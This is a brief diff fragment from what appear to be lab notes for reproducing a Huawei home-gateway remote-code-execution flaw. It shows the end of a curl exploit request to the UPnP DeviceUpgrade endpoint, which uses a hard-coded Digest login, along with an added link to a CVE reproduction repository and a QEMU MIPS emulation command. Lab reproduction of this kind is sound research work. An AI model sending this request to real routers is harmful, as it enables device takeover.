@@ -33,4 +33,6 @@ curl -X POST -H 'Authorization:Digest username=dslf-config, realm=HuaweiHomeGate
  </s:Body>
 </s:Envelope>' -D - http://192.168.10.2:37215/ctrlt/DeviceUpgrade_1
 
+https://codeload.github.com/wulei20/cve_17215/zip/refs/heads/main
+
 qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -netdev user,id=mynet,hostfwd=::6666-:22,hostfwd=::6667-:443,hostfwd=::6668-:37215 -append "root=/dev/sda1 console=tty0" -device rtl8139,netdev=mynet -nographic
